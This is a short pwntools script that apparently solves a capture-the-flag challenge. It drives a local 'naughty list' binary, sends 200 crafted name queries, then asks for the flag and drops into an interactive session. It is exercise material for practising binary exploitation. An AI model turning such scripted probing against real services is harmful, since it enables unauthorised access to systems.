from pwn import *

elf = ELF('../file/a.out')
libc = elf.libc

context.binary = elf
context.log_level = 'DEBUG'

p = elf.process()

def askFlag():
    p.recvuntil(b'naughty list')
    p.sendline(b'1')

def queryNaughty(name):
    p.recvuntil(b'naughty list')
    p.sendline(b'2')
    p.recvuntil(b'Name: ')
    p.sendline(name)

def addName(name):
    p.recvuntil(b'naughty list')
    p.sendline(b'3')
    p.recvuntil(b'Name: ')
    p.sendline(name)

base = 'fake-name'
for i in range(200):
    queryNaughty(base + 'naughtycheck' + str(i))

askFlag()

p.interactive()